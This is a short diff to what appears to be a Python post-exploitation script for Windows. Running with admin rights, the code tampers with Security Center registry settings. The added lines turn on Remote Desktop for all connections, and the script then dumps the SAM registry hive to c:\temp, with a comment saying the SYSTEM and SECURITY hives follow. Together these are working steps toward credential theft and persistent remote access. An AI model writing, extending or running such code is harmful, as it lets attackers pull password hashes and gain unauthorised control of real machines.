@@ -55,6 +55,10 @@ if isadmin:
     with OpenKey(HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Security Center", 0, KEY_WOW64_64KEY + KEY_ALL_ACCESS) as key:
         DeleteValue(key, "UACDisableNotify")
 
+#Enable RDP (for all)
+    with OpenKey(HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\Terminal Server", 0, KEY_WOW64_64KEY + KEY_ALL_ACCESS) as key:
+        SetValueEx(key, "fDenyTSConnections" , 0, REG_DWORD, 0)
+
 ##Save the SAM, SYSTEM and SECURITY files.
 
     shell.ShellExecuteEx(lpFile="reg.exe", lpParameters = "save hklm\\sam c:\\temp\\sam.save /y")
